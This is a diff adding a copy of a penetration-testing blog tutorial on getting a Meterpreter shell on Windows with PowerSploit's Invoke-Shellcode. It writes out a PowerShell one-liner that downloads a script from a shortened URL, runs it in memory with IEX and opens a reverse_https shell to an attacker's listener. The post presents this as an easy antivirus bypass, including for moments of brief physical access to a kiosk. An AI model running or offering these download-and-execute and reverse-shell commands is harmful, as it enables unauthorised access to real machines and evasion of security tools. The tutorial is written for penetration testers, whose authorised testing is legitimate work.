@@ -1,0 +1,43 @@
+################################################
+#PowerSploit: The Easiest Shell You’ll Ever Get#
+################################################
+
+Reference:
+https://www.pentestgeek.com/2013/09/18/invoke-shellcode/
+
+Sometimes you just want a shell. You don’t want to worry about compiling a binary, testing it against antivirus, figuring out how to upload it to the box and finally execute it. Maybe you are giving a demo of an awesome new Meterpreter post-exploitation module. Maybe you have less than a minute of physical access to a Windows kiosk machine and need a quick win. There are plenty of scenarios that end in a penetration tester gaining GUI access to a target machine through guessed or found RDP, ESX or VNC credentials. In those situations, the easiest way to get a Meterpreter shell without worrying about AV is with PowerSploit.
+
+PowerSploit  is a collection of security-related modules and functions written in PowerShell. PowerSploit is already in both BackTrack and Kali, and its code is utilized by other awesome tools like SET  so you may already be using it!  Many of the scripts in the project are extremely useful in post-exploitation in Windows environments.  The project was started by Matt Graeber who is the author of the function we will use in this tutorial: Invoke-Shellcode.
+
+
+In order for this to work, the target machine must have PowerShell installed and internet access. The first step is for us to set up our handler on our attacker box. This is something we will likely do often, so let’s automated it with a really simple Python script:
+
+script PowerSploit: The Easiest Shell Youll Ever Get
+
+To start the multi/handler and configure it, we just run the script:
+
+python StartListener.py 192.168.0.15 443
+
+Now that our handler is ready, we can move on to executing our shell.  The first thing I did to make the next step easier to type is shorten the github link to Invoke-Shellcode with bitly:
+
+bitly PowerSploit: The Easiest Shell Youll Ever Get
+
+Next, we need to run two commands in a PowerShell prompt to get our Meterpreter shell. The first command will create a .Net WebClient Object to download the function and pass it to Invoke-Expression to put it into memory:
+
+IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/14bZZ0c’)
+
+Now we just need to make a call to the Invoke-Shellcode function with the relevant parameters from the listener:
+
+Invoke-Shellcode –Payload windows/meterpreter/reverse_https –Lhost 192.168.0.15 –Lport 443 –Force
+
+We can actually combine these commands to run a single command to execute our shell:
+
+IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/14bZZ0c’); Invoke-Shellcode –Payload windows/meterpreter/reverse_https –Lhost 172.0.1.200 –Lport 443 –Force
+
+powershell PowerSploit: The Easiest Shell Youll Ever Get
+
+Once we get the prompt back, we can safely close PowerShell because the ultra-useful Smart_Migrate Meterpreter script has safely landed us in a new process:
+
+meterpreter PowerSploit: The Easiest Shell Youll Ever Get
+
+That is the easiest and most convenient AV-bypass I have ever seen!  Just open PowerShell and type a command.  Hopefully this post has shown you one way PowerSploit can make your life as a pen-tester easier.  You can find more ways at my  blog and by following me on twitter.  Also, join me at Derbycon when I will talk about the Pass-the-Hash attack and some simple mitigations with Skip Duckwall and how to use PowerSploit and Windows tools to accomplish post-exploitation tasks without uploading binaries with Matt Graeber.  I hope to see you all there!
